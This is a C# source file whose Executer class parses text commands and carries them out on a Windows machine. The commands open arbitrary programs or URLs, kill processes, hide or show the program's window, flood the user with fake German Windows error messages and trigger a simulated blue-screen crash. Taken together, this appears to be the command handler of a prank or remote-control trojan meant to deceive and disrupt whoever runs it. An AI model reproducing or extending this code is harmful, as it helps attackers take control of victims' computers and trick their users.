using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OG
{
    class Executer
    {

        public static void Run(string command)
        {
            try
            {
                string[] parsed = command.Split(' ');

                if (parsed[0] == "o") // Opens a process (o PROCESS_NAME or URL)
                {
                    Process.Start(parsed[1]);
                }
                else if(parsed[0] == "k")  // Kills process (k PROCESS_NAME)
                {
                    Process.GetProcessesByName(parsed[1])[0].Kill();
                }
                else if(parsed[0] == "spam") // Creates spam message (spam COUNT)
                {
                    for(int i = 0;i < int.Parse(parsed[1]); i++)
                    {
                        MessageBox.Show("Etwas ging schief mit Windows", $"Fehler {i}", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else if(parsed[0] == "h") // Hides window
                {
                    Util.HideWindow();
                }
                else if(parsed[0] == "s") // Shows window
                {
                    Util.ShowWindow();
                }
                else if(parsed[0] == "ping") // Ping!... and Pong!
                {
                    Util.ShowAlert("Ping", "Pong");
                }
                
                else if(parsed[0] == "quit") //Closes Program
                {
                    Environment.Exit(0);
                }
                else if(parsed[0] == "fuckwin") // Simulates the BSOD (Blue screen of dead) 
                {
                    Util.FuckWin();
                        
                }

            }
            catch(Exception ex)
            {
                Alert.Error(ex.Message);
            }

        }
    }
}
